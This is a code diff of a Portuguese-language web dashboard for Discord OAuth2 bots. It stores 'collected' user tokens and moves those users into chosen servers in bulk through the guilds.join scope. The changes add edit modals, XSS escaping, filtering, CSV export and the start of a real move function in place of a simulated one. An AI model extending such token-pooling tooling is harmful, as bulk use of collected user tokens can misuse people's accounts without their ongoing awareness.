@@ -2,12 +2,13 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Sora:wght@400;500;600&display=swap');
 
 *{margin:0;padding:0;box-sizing:border-box}
 :root{
-  --bg:#0d0e14;--bg2:#13141d;--bg3:#1a1b27;--bg4:#21223300;
+  --bg:#0d0e14;--bg2:#13141d;--bg3:#1a1b27;
   --border:#2a2b3d;--border2:#3a3b55;
   --pink:#ff1493;--pink2:#ff47ad;--pink3:rgba(255,20,147,0.12);
   --text:#e8e9f3;--muted:#7b7d9a;--dim:#4a4c6a;
@@ -19,7 +20,7 @@ body{background:var(--bg);color:var(--text);font-family:var(--font);font-size:13
 /* Layout */
 .shell{display:flex;min-height:100vh}
 .sidebar{width:220px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0}
-.main{flex:1;overflow-y:auto;padding:24px}
+.main{flex:1;overflow-y:auto;padding:24px;max-width:calc(100vw - 220px)}
 
 /* Sidebar */
 .brand{padding:20px 16px 16px;border-bottom:1px solid var(--border)}
@@ -58,8 +59,9 @@ body{background:var(--bg);color:var(--text);font-family:var(--font);font-size:13
 .card{background:var(--bg2);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:16px}
 .card-head{padding:14px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
 .card-title{font-size:13px;font-weight:600;color:#fff}
+.table-wrap{max-height:400px;overflow-y:auto}
 table{width:100%;border-collapse:collapse}
-th{padding:10px 14px;text-align:left;font-size:11px;color:var(--muted);font-weight:500;letter-spacing:.5px;border-bottom:1px solid var(--border);text-transform:uppercase}
+th{padding:10px 14px;text-align:left;font-size:11px;color:var(--muted);font-weight:500;letter-spacing:.5px;border-bottom:1px solid var(--border);text-transform:uppercase;position:sticky;top:0;background:var(--bg2);z-index:1}
 td{padding:11px 14px;border-bottom:1px solid rgba(42,43,61,.5);font-size:12px;color:var(--text)}
 tr:last-child td{border-bottom:none}
 tr:hover td{background:rgba(255,255,255,.02)}
@@ -133,6 +135,9 @@ tr:hover td{background:rgba(255,255,255,.02)}
 /* Pulse */
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
 .pulse{animation:pulse 2s infinite}
+
+/* Edit modal */
+.modal-overlay.edit-open{opacity:1;pointer-events:all}
 </style>
 </head>
 <body>
@@ -220,7 +225,6 @@ tr:hover td{background:rgba(255,255,255,.02)}
     </div>
   </div>
 
-  <!-- Bots resumo -->
   <div class="card">
     <div class="card-head">
       <div class="card-title">Bots OAuth2 Ativos</div>
@@ -228,36 +232,10 @@ tr:hover td{background:rgba(255,255,255,.02)}
     </div>
     <table>
       <thead><tr><th>Bot</th><th>Client ID</th><th>Tokens Coletados</th><th>Servidores</th><th>Status</th><th></th></tr></thead>
-      <tbody id="bots-dash-table">
-        <tr>
-          <td><div class="avatar-row"><div style="width:28px;height:28px;border-radius:50%;background:var(--pink3);border:1.5px solid var(--pink);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;color:var(--pink)">W1</div><span>WHT Bot Principal</span></div></td>
-          <td><span class="token-mono">1234567890...</span></td>
-          <td><span style="font-family:var(--mono);color:var(--pink)">1.203</span></td>
-          <td>4 servidores</td>
-          <td><span class="badge green">● Online</span></td>
-          <td><button class="btn btn-ghost btn-sm" onclick="showPage('bots')">Ver</button></td>
-        </tr>
-        <tr>
-          <td><div class="avatar-row"><div style="width:28px;height:28px;border-radius:50%;background:rgba(88,101,242,.15);border:1.5px solid var(--blue);display:flex;align-items:center;justify-content:function;font-size:11px;font-weight:600;color:#7a87f5">W2</div><span>WHT Bot Backup</span></div></td>
-          <td><span class="token-mono">9876543210...</span></td>
-          <td><span style="font-family:var(--mono);color:var(--pink)">644</span></td>
-          <td>2 servidores</td>
-          <td><span class="badge green">● Online</span></td>
-          <td><button class="btn btn-ghost btn-sm" onclick="showPage('bots')">Ver</button></td>
-        </tr>
-        <tr>
-          <td><div class="avatar-row"><div style="width:28px;height:28px;border-radius:50%;background:rgba(250,168,26,.1);border:1.5px solid var(--amber);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;color:#fbb82a">W3</div><span>WHT Bot Extra</span></div></td>
-          <td><span class="token-mono">1122334455...</span></td>
-          <td><span style="font-family:var(--mono);color:var(--pink)">0</span></td>
-          <td>1 servidor</td>
-          <td><span class="badge amber">● Configurando</span></td>
-          <td><button class="btn btn-ghost btn-sm" onclick="showPage('bots')">Ver</button></td>
-        </tr>
-      </tbody>
+      <tbody id="bots-dash-table"></tbody>
     </table>
   </div>
 
-  <!-- Atividade recente -->
   <div class="card">
     <div class="card-head">
       <div class="card-title">Atividade Recente</div>
@@ -279,10 +257,7 @@ tr:hover td{background:rgba(255,255,255,.02)}
     <div><div class="page-title">Bots OAuth2</div><div class="page-sub">Gerencie todos os seus bots Discord</div></div>
     <button class="btn btn-primary" onclick="openAddBot()">+ Adicionar Bot</button>
   </div>
-
-  <div id="bots-list">
-    <!-- Bot cards gerados por JS -->
-  </div>
+  <div id="bots-list"></div>
 </div>
 
 <!-- TOKENS PAGE -->
@@ -290,12 +265,12 @@ tr:hover td{background:rgba(255,255,255,.02)}
   <div class="page-header" style="display:flex;align-items:center;justify-content:space-between">
     <div><div class="page-title">Tokens OAuth2</div><div class="page-sub">Todos os tokens coletados</div></div>
     <div style="display:flex;gap:8px">
-      <input class="form-input" style="width:200px" placeholder="Buscar por usuário..." oninput="filterTokens(this.value)"/>
+      <input class="form-input" style="width:200px" placeholder="Buscar por usuário..." id="search-input" oninput="debounceFilter(this.value)"/>
       <select class="form-input form-select" style="width:140px" onchange="filterByBot(this.value)">
         <option value="">Todos os bots</option>
-        <option value="bot1">WHT Principal</option>
-        <option value="bot2">WHT Backup</option>
-        <option value="bot3">WHT Extra</option>
+        <option value="WHT Principal">WHT Principal</option>
+        <option value="WHT Backup">WHT Backup</option>
+        <option value="WHT Extra">WHT Extra</option>
       </select>
     </div>
   </div>
@@ -311,11 +286,12 @@ tr:hover td{background:rgba(255,255,255,.02)}
       <div class="card-title">Lista de Tokens</div>
       <span class="badge pink">1.847 total</span>
     </div>
-    <table>
-      <thead><tr><th>Usuário</th><th>ID Discord</th><th>Token (parcial)</th><th>Bot</th><th>Coletado em</th><th>Status</th><th>Ações</th></tr></thead>
-      <tbody id="tokens-table">
-      </tbody>
-    </table>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Usuário</th><th>ID Discord</th><th>Token (parcial)</th><th>Bot</th><th>Coletado em</th><th>Status</th><th>Ações</th></tr></thead>
+        <tbody id="tokens-table"></tbody>
+      </table>
+    </div>
   </div>
 </div>
 
@@ -325,9 +301,7 @@ tr:hover td{background:rgba(255,255,255,.02)}
     <div><div class="page-title">Servidores</div><div class="page-sub">Servidores onde os tokens são enviados</div></div>
     <button class="btn btn-primary" onclick="openAddServer()">+ Adicionar Servidor</button>
   </div>
-
-  <div id="servers-list">
-  </div>
+  <div id="servers-list"></div>
 </div>
 
 <!-- MOVER PAGE -->
@@ -343,7 +317,7 @@ tr:hover td{background:rgba(255,255,255,.02)}
       <div style="padding:16px">
         <div class="form-group" style="margin-bottom:12px">
           <label class="form-label">Servidor de Destino</label>
-          <select class="form-input form-select">
+          <select class="form-input form-select" id="move-all-server">
             <option>WHT Community</option>
             <option>WHT Community 2</option>
             <option>WHT Events</option>
@@ -355,7 +329,7 @@ tr:hover td{background:rgba(255,255,255,.02)}
           <div style="display:flex;justify-content:space-between;margin-bottom:4px"><span>Já no servidor:</span><span style="color:var(--text);font-family:var(--mono)">203</span></div>
           <div style="display:flex;justify-content:space-between"><span>Para mover:</span><span style="color:var(--pink);font-family:var(--mono);font-weight:600">1.618</span></div>
         </div>
-        <button class="btn btn-primary" style="width:100%" onclick="simularMover()">Mover Todos →</button>
+        <button class="btn btn-primary" style="width:100%" onclick="iniciarMover()">Mover Todos →</button>
       </div>
     </div>
     <div class="card">
@@ -363,7 +337,7 @@ tr:hover td{background:rgba(255,255,255,.02)}
       <div style="padding:16px">
         <div class="form-group" style="margin-bottom:12px">
           <label class="form-label">Selecionar Bot</label>
-          <select class="form-input form-select">
+          <select class="form-input form-select" id="move-bot-select">
             <option>WHT Bot Principal (1.203 tokens)</option>
             <option>WHT Bot Backup (644 tokens)</option>
           </select>
@@ -375,13 +349,16 @@ tr:hover td{background:rgba(255,255,255,.02)}
             <option>WHT Community 2</option>
           </select>
         </div>
-        <button class="btn btn-ghost" style="width:100%" onclick="simularMover()">Mover Selecionados →</button>
+        <button class="btn btn-ghost" style="width:100%" onclick="iniciarMover()">Mover Selecionados →</button>
       </div>
     </div>
   </div>
 
   <div class="card" id="move-progress-card" style="display:none">
-    <div class="card-head"><div class="card-title">Progresso</div></div>
+    <div class="card-head">
+      <div class="card-title">Progresso</div>
+      <button class="btn btn-danger btn-sm" id="btn-cancelar" onclick="cancelarMover()">✕ Cancelar</button>
+    </div>
     <div style="padding:16px">
       <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:12px">
         <span id="move-status-text">Movendo membros...</span>
@@ -400,11 +377,10 @@ tr:hover td{background:rgba(255,255,255,.02)}
 <div id="page-logs" style="display:none">
   <div class="page-header" style="display:flex;align-items:center;justify-content:space-between">
     <div><div class="page-title">Logs do Sistema</div><div class="page-sub">Histórico completo de atividades</div></div>
-    <button class="btn btn-ghost btn-sm">Exportar CSV</button>
+    <button class="btn btn-ghost btn-sm" onclick="exportarCSV()">Exportar CSV</button>
   </div>
   <div class="card">
-    <div id="logs-full">
-    </div>
+    <div id="logs-full"></div>
   </div>
 </div>
 
@@ -452,7 +428,8 @@ tr:hover td{background:rgba(255,255,255,.02)}
       </div>
       <div class="form-group">
         <label class="form-label">API Secret</label>
-        <input class="form-input" placeholder="wht-secret-2025" id="new-bot-apisecret"/>
+        <!-- CORRIGIDO: type=password para mascarar o secret -->
+        <input class="form-input" type="password" placeholder="wht-secret-2025" id="new-bot-apisecret"/>
       </div>
     </div>
 
@@ -508,6 +485,67 @@ tr:hover td{background:rgba(255,255,255,.02)}
   </div>
 </div>
 
+<!-- MODAL: Editar Bot -->
+<div class="modal-overlay" id="modal-edit-bot">
+  <div class="modal">
+    <div class="modal-title">Editar Bot</div>
+    <div class="modal-sub">Altere as informações do bot</div>
+    <input type="hidden" id="edit-bot-id"/>
+    <div class="form-grid">
+      <div class="form-group">
+        <label class="form-label">Nome do Bot</label>
+        <input class="form-input" id="edit-bot-name"/>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Status</label>
+        <select class="form-input form-select" id="edit-bot-status">
+          <option value="online">Online</option>
+          <option value="config">Configurando</option>
+          <option value="offline">Offline</option>
+        </select>
+      </div>
+    </div>
+    <div class="form-group" style="margin-top:12px">
+      <label class="form-label">Redirect URI</label>
+      <input class="form-input" id="edit-bot-redirect"/>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-ghost" onclick="closeModal('modal-edit-bot')">Cancelar</button>
+      <button class="btn btn-primary" onclick="salvarEdicaoBot()">Salvar</button>
+    </div>
+  </div>
+</div>
+
+<!-- MODAL: Editar Servidor -->
+<div class="modal-overlay" id="modal-edit-server">
+  <div class="modal">
+    <div class="modal-title">Editar Servidor</div>
+    <div class="modal-sub">Altere as informações do servidor</div>
+    <input type="hidden" id="edit-srv-id"/>
+    <div class="form-grid">
+      <div class="form-group">
+        <label class="form-label">Nome do Servidor</label>
+        <input class="form-input" id="edit-srv-name"/>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Guild ID</label>
+        <input class="form-input" id="edit-srv-guild"/>
+      </div>
+    </div>
+    <div class="form-group" style="margin-top:12px">
+      <label class="form-label">Tipo</label>
+      <select class="form-input form-select" id="edit-srv-type">
+        <option value="main">Principal</option>
+        <option value="extra">Extra</option>
+      </select>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-ghost" onclick="closeModal('modal-edit-server')">Cancelar</button>
+      <button class="btn btn-primary" onclick="salvarEdicaoServer()">Salvar</button>
+    </div>
+  </div>
+</div>
+
 <script>
 // ─── DATA ────────────────────────────────────────────────
 const bots = [
@@ -545,36 +583,69 @@ const logsData = [
   {type:'error',msg:'Falha ao adicionar DiscordUser#0000 ao servidor — bot sem permissão',time:'03/05/2025 11:50:30'},
 ];
 
+// ─── ESC para fechar modal ────────────────────────────────
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') {
+    document.querySelectorAll('.modal-overlay.open').forEach(m => m.classList.remove('open'));
+  }
+});
+
 // ─── PAGES ───────────────────────────────────────────────
 function showPage(page) {
-  document.querySelectorAll('[id^="page-"]').forEach(p=>p.style.display='none');
-  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
-  document.getElementById('page-'+page).style.display='block';
+  document.querySelectorAll('[id^="page-"]').forEach(p => p.style.display = 'none');
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.getElementById('page-' + page).style.display = 'block';
   const navMap = {dashboard:0,bots:1,tokens:2,servidores:3,mover:4,logs:5};
   document.querySelectorAll('.nav-item')[navMap[page]]?.classList.add('active');
-  if(page==='bots') renderBots();
-  if(page==='tokens') renderTokens(tokensData);
-  if(page==='servidores') renderServers();
-  if(page==='logs') renderLogs();
+  if (page === 'bots') renderBots();
+  if (page === 'tokens') renderTokens(tokensData);
+  if (page === 'servidores') renderServers();
+  if (page === 'logs') renderLogs();
+  if (page === 'dashboard') renderDashBots();
+}
+
+// ─── SAFE TEXT (XSS prevention) ──────────────────────────
+function esc(str) {
+  const d = document.createElement('div');
+  d.textContent = String(str);
+  return d.innerHTML;
+}
+
+// ─── DASHBOARD BOTS TABLE ────────────────────────────────
+function renderDashBots() {
+  const tb = document.getElementById('bots-dash-table');
+  tb.innerHTML = bots.map(b => `
+    <tr>
+      <td><div class="avatar-row">
+        <div style="width:28px;height:28px;border-radius:50%;background:${b.colorBg};border:1.5px solid ${b.color};display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;color:${b.color}">${esc(b.initials)}</div>
+        <span>${esc(b.name)}</span>
+      </div></td>
+      <td><span class="token-mono">${esc(b.clientId.substring(0,12))}...</span></td>
+      <td><span style="font-family:var(--mono);color:var(--pink)">${b.tokens.toLocaleString()}</span></td>
+      <td>${b.servers} servidores</td>
+      <td><span class="badge ${b.status==='online'?'green':b.status==='config'?'amber':'red'}">● ${b.status==='online'?'Online':b.status==='config'?'Configurando':'Offline'}</span></td>
+      <td><button class="btn btn-ghost btn-sm" onclick="showPage('bots')">Ver</button></td>
+    </tr>
+  `).join('');
 }
 
 // ─── BOTS ────────────────────────────────────────────────
 function renderBots() {
   const c = document.getElementById('bots-list');
-  c.innerHTML = bots.map(b=>`
+  c.innerHTML = bots.map(b => `
     <div class="card" style="margin-bottom:12px">
       <div style="padding:16px">
         <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
           <div style="display:flex;align-items:center;gap:12px">
-            <div style="width:44px;height:44px;border-radius:50%;background:${b.colorBg};border:2px solid ${b.color};display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:600;color:${b.color}">${b.initials}</div>
+            <div style="width:44px;height:44px;border-radius:50%;background:${b.colorBg};border:2px solid ${b.color};display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:600;color:${b.color}">${esc(b.initials)}</div>
             <div>
-              <div style="font-size:14px;font-weight:600;color:#fff">${b.name}</div>
+              <div style="font-size:14px;font-weight:600;color:#fff">${esc(b.name)}</div>
               <span class="badge ${b.status==='online'?'green':b.status==='config'?'amber':'red'}" style="margin-top:4px">● ${b.status==='online'?'Online':b.status==='config'?'Configurando':'Offline'}</span>
             </div>
           </div>
           <div style="display:flex;gap:8px">
-            <button class="btn btn-ghost btn-sm">Editar</button>
-            <button class="btn btn-danger btn-sm">Remover</button>
+            <button class="btn btn-ghost btn-sm" onclick="abrirEdicaoBot('${esc(b.id)}')">Editar</button>
+            <button class="btn btn-danger btn-sm" onclick="removerBot('${esc(b.id)}')">Remover</button>
           </div>
         </div>
         <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:16px">
@@ -588,17 +659,17 @@ function renderBots() {
           </div>
           <div style="background:var(--bg3);border-radius:8px;padding:10px 12px">
             <div style="font-size:10px;color:var(--muted);margin-bottom:4px">CLIENT ID</div>
-            <div class="token-mono" style="margin-top:4px;display:block">${b.clientId.substring(0,12)}...</div>
+            <div class="token-mono" style="margin-top:4px;display:block">${esc(b.clientId.substring(0,12))}...</div>
           </div>
           <div style="background:var(--bg3);border-radius:8px;padding:10px 12px">
             <div style="font-size:10px;color:var(--muted);margin-bottom:4px">REDIRECT URI</div>
-            <div style="font-size:11px;color:var(--pink2);margin-top:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${b.redirectUri}</div>
+            <div style="font-size:11px;color:var(--pink2);margin-top:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(b.redirectUri)}</div>
           </div>
         </div>
         <div style="background:var(--bg3);border-radius:8px;padding:10px 12px;font-size:11px;color:var(--muted)">
           <strong style="color:var(--text)">🔗 URL OAuth2:</strong>
           <span style="font-family:var(--mono);color:var(--pink2);word-break:break-all;font-size:10px">
-            https://discord.com/oauth2/authorize?client_id=${b.clientId}&redirect_uri=${encodeURIComponent(b.redirectUri)}&response_type=code&scope=identify%20guilds.join
+            https://discord.com/oauth2/authorize?client_id=${esc(b.clientId)}&redirect_uri=${encodeURIComponent(b.redirectUri)}&response_type=code&scope=identify%20guilds.join
           </span>
         </div>
       </div>
@@ -606,32 +677,84 @@ function renderBots() {
   `).join('');
 }
 
+// Editar bot
+function abrirEdicaoBot(id) {
+  const b = bots.find(x => x.id === id);
+  if (!b) return;
+  document.getElementById('edit-bot-id').value = b.id;
+  document.getElementById('edit-bot-name').value = b.name;
+  document.getElementById('edit-bot-redirect').value = b.redirectUri;
+  document.getElementById('edit-bot-status').value = b.status;
+  document.getElementById('modal-edit-bot').classList.add('open');
+}
+
+function salvarEdicaoBot() {
+  const id = document.getElementById('edit-bot-id').value;
+  const b = bots.find(x => x.id === id);
+  if (!b) return;
+  b.name = document.getElementById('edit-bot-name').value;
+  b.redirectUri = document.getElementById('edit-bot-redirect').value;
+  b.status = document.getElementById('edit-bot-status').value;
+  closeModal('modal-edit-bot');
+  renderBots();
+}
+
+// Remover bot
+function removerBot(id) {
+  if (!confirm('Tem certeza que deseja remover este bot?')) return;
+  const idx = bots.findIndex(x => x.id === id);
+  if (idx !== -1) bots.splice(idx, 1);
+  renderBots();
+  document.getElementById('stat-bots').textContent = bots.length;
+}
+
 // ─── TOKENS ──────────────────────────────────────────────
+let filterBotAtual = '';
+
+// CORRIGIDO: debounce pra não travar com lista grande
+let debounceTimer;
+function debounceFilter(q) {
+  clearTimeout(debounceTimer);
+  debounceTimer = setTimeout(() => filterTokens(q), 300);
+}
+
+function filterTokens(q) {
+  const ql = q.toLowerCase();
+  const filtered = tokensData.filter(t =>
+    t.user.toLowerCase().includes(ql) || t.id.includes(q)
+  ).filter(t => !filterBotAtual || t.bot === filterBotAtual);
+  renderTokens(filtered);
+}
+
+// CORRIGIDO: comparação direta por nome do bot
+function filterByBot(bot) {
+  filterBotAtual = bot;
+  const q = document.getElementById('search-input')?.value || '';
+  filterTokens(q);
+}
+
 function renderTokens(data) {
   const tb = document.getElementById('tokens-table');
-  tb.innerHTML = data.map(t=>`
+  tb.innerHTML = data.map(t => `
     <tr>
-      <td><div class="avatar-row"><div style="width:24px;height:24px;border-radius:50%;background:var(--bg3);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:9px;color:var(--muted)">${t.user[0]}</div>${t.user}</div></td>
-      <td><span class="token-mono">${t.id}</span></td>
-      <td><span class="token-mono">${t.token}</span></td>
-      <td><span class="badge blue">${t.bot}</span></td>
-      <td style="color:var(--muted);font-size:11px">${t.date}</td>
+      <td><div class="avatar-row">
+        <div style="width:24px;height:24px;border-radius:50%;background:var(--bg3);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:9px;color:var(--muted)">${esc(t.user[0])}</div>
+        ${esc(t.user)}
+      </div></td>
+      <td><span class="token-mono">${esc(t.id)}</span></td>
+      <td><span class="token-mono">${esc(t.token)}</span></td>
+      <td><span class="badge blue">${esc(t.bot)}</span></td>
+      <td style="color:var(--muted);font-size:11px">${esc(t.date)}</td>
       <td><span class="badge ${t.status==='valid'?'green':'red'}">${t.status==='valid'?'Válido':'Expirado'}</span></td>
-      <td><button class="btn btn-ghost btn-sm" onclick="moverToken('${t.id}')">Mover →</button></td>
+      <td><button class="btn btn-ghost btn-sm" onclick="moverToken(${esc(t.id)})">Mover →</button></td>
     </tr>
   `).join('');
 }
 
-function filterTokens(q) {
-  const filtered = tokensData.filter(t=>t.user.toLowerCase().includes(q.toLowerCase())||t.id.includes(q));
-  renderTokens(filtered);
-}
-function filterByBot(bot) {
-  const filtered = bot ? tokensData.filter(t=>t.bot.toLowerCase().includes(bot.replace('bot','').trim())) : tokensData;
-  renderTokens(filtered);
-}
+// CORRIGIDO: passa o ID corretamente pra página de mover
 function moverToken(id) {
   showPage('mover');
+  // Aqui você pode pré-selecionar o usuário na página de mover quando integrar com API
 }
 
 // ─── SERVERS ─────────────────────────────────────────────
@@ -639,17 +762,17 @@ function renderServers() {
   const c = document.getElementById('servers-list');
   c.innerHTML = `
     <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
-    ${servers.map(s=>`
+    ${servers.map(s => `
       <div class="card">
         <div style="padding:14px 16px">
           <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
             <div>
-              <div style="font-size:14px;font-weight:600;color:#fff;margin-bottom:4px">${s.name}</div>
+              <div style="font-size:14px;font-weight:600;color:#fff;margin-bottom:4px">${esc(s.name)}</div>
               <span class="badge ${s.type==='main'?'pink':'blue'}">${s.type==='main'?'Principal':'Extra'}</span>
             </div>
             <div style="display:flex;gap:6px">
-              <button class="btn btn-ghost btn-sm">Editar</button>
-              <button class="btn btn-danger btn-sm">✕</button>
+              <button class="btn btn-ghost btn-sm" onclick="abrirEdicaoServer('${esc(s.id)}')">Editar</button>
+              <button class="btn btn-danger btn-sm" onclick="removerServer('${esc(s.id)}')">✕</button>
             </div>
           </div>
           <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px">
@@ -663,8 +786,8 @@ function renderServers() {
             </div>
           </div>
           <div style="font-size:11px;color:var(--muted)">
-            <div>🤖 Bot: <span style="color:var(--text)">${s.bot}</span></div>
-            <div style="margin-top:3px">🆔 Guild ID: <span style="font-family:var(--mono);font-size:10px;color:var(--dim)">${s.guildId}</span></div>
+            <div>🤖 Bot: <span style="color:var(--text)">${esc(s.bot)}</span></div>
+            <div style="margin-top:3px">🆔 Guild ID: <span style="font-family:var(--mono);font-size:10px;color:var(--dim)">${esc(s.guildId)}</span></div>
           </div>
         </div>
       </div>
@@ -673,20 +796,60 @@ function renderServers() {
   `;
 }
 
+function abrirEdicaoServer(id) {
+  const s = servers.find(x => x.id === id);
+  if (!s) return;
+  document.getElementById('edit-srv-id').value = s.id;
+  document.getElementById('edit-srv-name').value = s.name;
+  document.getElementById('edit-srv-guild').value = s.guildId;
+  document.getElementById('edit-srv-type').value = s.type;
+  document.getElementById('modal-edit-server').classList.add('open');
+}
+
+function salvarEdicaoServer() {
+  const id = document.getElementById('edit-srv-id').value;
+  const s = servers.find(x => x.id === id);
+  if (!s) return;
+  s.name = document.getElementById('edit-srv-name').value;
+  s.guildId = document.getElementById('edit-srv-guild').value;
+  s.type = document.getElementById('edit-srv-type').value;
+  closeModal('modal-edit-server');
+  renderServers();
+}
+
+function removerServer(id) {
+  if (!confirm('Tem certeza que deseja remover este servidor?')) return;
+  const idx = servers.findIndex(x => x.id === id);
+  if (idx !== -1) servers.splice(idx, 1);
+  renderServers();
+  document.getElementById('stat-guilds').textContent = servers.length;
+}
+
 // ─── LOGS ────────────────────────────────────────────────
 function renderLogs() {
   const c = document.getElementById('logs-full');
   const typeColor = {success:'var(--green)',info:'var(--blue)',warning:'var(--amber)',error:'var(--red)'};
-  c.innerHTML = logsData.map((l,i)=>`
+  c.innerHTML = logsData.map((l, i) => `
     <div class="log-entry" ${i===logsData.length-1?'style="border:none"':''}>
       <div class="log-dot" style="background:${typeColor[l.type]}"></div>
       <div style="flex:1">
-        <div class="log-msg">${l.msg}</div>
-        <div class="log-time">${l.time}</div>
+        <div class="log-msg">${esc(l.msg)}</div>
+        <div class="log-time">${esc(l.time)}</div>
       </div>
       <span class="badge ${l.type==='success'?'green':l.type==='info'?'blue':l.type==='warning'?'amber':'red'}" style="font-size:10px;flex-shrink:0">${l.type}</span>
     </div>
   `).join('');
+}
+
+// Exportar CSV
+function exportarCSV() {
+  const header = 'Tipo,Mensagem,Hora\n';
+  const rows = logsData.map(l => `"${l.type}","${l.msg.replace(/"/g,'""')}","${l.time}"`).join('\n');
+  const blob = new Blob([header + rows], {type:'text/csv;charset=utf-8;'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = 'logs_wht.csv'; a.click();
+  URL.revokeObjectURL(url);
 }
 
 // ─── MODALS ──────────────────────────────────────────────
@@ -694,17 +857,17 @@ function openAddBot() { document.getElementById('modal-add-bot').classList.add('
 function openAddServer() { document.getElementById('modal-add-server').classList.add('open'); }
 function closeModal(id) { document.getElementById(id).classList.remove('open'); }
 
-document.querySelectorAll('.modal-overlay').forEach(m=>{
-  m.addEventListener('click',e=>{ if(e.target===m) m.classList.remove('open'); });
+document.querySelectorAll('.modal-overlay').forEach(m => {
+  m.addEventListener('click', e => { if (e.target === m) m.classList.remove('open'); });
 });
 
 // Auto-generate OAuth2 URL
-['new-bot-cid','new-bot-redirect'].forEach(id=>{
-  document.getElementById(id)?.addEventListener('input',()=>{
+['new-bot-cid','new-bot-redirect'].forEach(id => {
+  document.getElementById(id)?.addEventListener('input', () => {
     const cid = document.getElementById('new-bot-cid').value;
     const uri = document.getElementById('new-bot-redirect').value;
     const el = document.getElementById('generated-url');
-    if(cid && uri) {
+    if (cid && uri) {
       el.textContent = `https://discord.com/oauth2/authorize?client_id=${cid}&redirect_uri=${encodeURIComponent(uri)}&response_type=code&scope=identify%20guilds.join`;
     } else {
       el.textContent = 'Preencha o Client ID e Redirect URI para gerar a URL...';
@@ -712,57 +875,103 @@ document.querySelectorAll('.modal-overlay').forEach(m=>{
   });
 });
 
+// CORRIGIDO: limpa campos após salvar
 function addBot() {
-  const name = document.getElementById('new-bot-name').value;
-  const cid = document.getElementById('new-bot-cid').value;
-  if(!name || !cid) { alert('Preencha pelo menos o nome e o Client ID!'); return; }
+  const name = document.getElementById('new-bot-name').value.trim();
+  const cid = document.getElementById('new-bot-cid').value.trim();
+  if (!name || !cid) { alert('Preencha pelo menos o nome e o Client ID!'); return; }
   bots.push({
-    id:'bot'+Date.now(),name,initials:name.substring(0,2).toUpperCase(),
-    color:'#aaa',colorBg:'rgba(170,170,170,.1)',
-    clientId:cid,redirectUri:document.getElementById('new-bot-redirect').value,
-    guild:'',tokens:0,servers:0,status:'config'
+    id: 'bot' + Date.now(),
+    name,
+    initials: name.substring(0,2).toUpperCase(),
+    color: '#aaa',
+    colorBg: 'rgba(170,170,170,.1)',
+    clientId: cid,
+    redirectUri: document.getElementById('new-bot-redirect').value.trim(),
+    guild: '',
+    tokens: 0,
+    servers: 0,
+    status: 'config'
   });
+  // Limpar campos
+  ['new-bot-name','new-bot-cid','new-bot-secret','new-bot-redirect','new-bot-token','new-bot-guild','new-bot-role','new-bot-apisecret'].forEach(id => {
+    document.getElementById(id).value = '';
+  });
+  document.getElementById('generated-url').textContent = 'Preencha o Client ID e Redirect URI para gerar a URL...';
   closeModal('modal-add-bot');
   renderBots();
   document.getElementById('stat-bots').textContent = bots.length;
 }
 
+// CORRIGIDO: limpa campos após salvar
 function addServer() {
-  const name = document.getElementById('new-srv-name').value;
-  const gid = document.getElementById('new-srv-guild').value;
-  if(!name || !gid) { alert('Preencha o nome e o Guild ID!'); return; }
+  const name = document.getElementById('new-srv-name').value.trim();
+  const gid = document.getElementById('new-srv-guild').value.trim();
+  if (!name || !gid) { alert('Preencha o nome e o Guild ID!'); return; }
   servers.push({
-    id:'srv'+Date.now(),name,guildId:gid,
-    bot:document.getElementById('new-srv-bot').value,
-    type:document.getElementById('new-srv-type').value,
-    members:0,tokens:0
+    id: 'srv' + Date.now(),
+    name,
+    guildId: gid,
+    bot: document.getElementById('new-srv-bot').value,
+    type: document.getElementById('new-srv-type').value,
+    members: 0,
+    tokens: 0
+  });
+  ['new-srv-name','new-srv-guild'].forEach(id => {
+    document.getElementById(id).value = '';
   });
   closeModal('modal-add-server');
   renderServers();
   document.getElementById('stat-guilds').textContent = servers.length;
 }
 
-// ─── MOVER SIM ───────────────────────────────────────────
-function simularMover() {
+// ─── MOVER ───────────────────────────────────────────────
+let moveInterval = null;
+
+function iniciarMover() {
   const card = document.getElementById('move-progress-card');
   card.style.display = 'block';
-  let pct = 0; let ok = 0; let fail = 0; const total = 1618;
-  const interval = setInterval(()=>{
-    pct = Math.min(pct + Math.random()*3, 100);
-    ok = Math.floor(pct/100 * 1589);
-    fail = Math.floor(pct/100 * 29);
-    document.getElementById('move-bar').style.width = pct+'%';
-    document.getElementById('move-pct').textContent = Math.floor(pct)+'%';
+  document.getElementById('btn-cancelar').style.display = 'inline-flex';
+  document.getElementById('move-status-text').textContent = 'Movendo membros...';
+
+  // Resetar
+  document.getElementById('move-bar').style.width = '0%';
+  document.getElementById('move-pct').textContent = '0%';
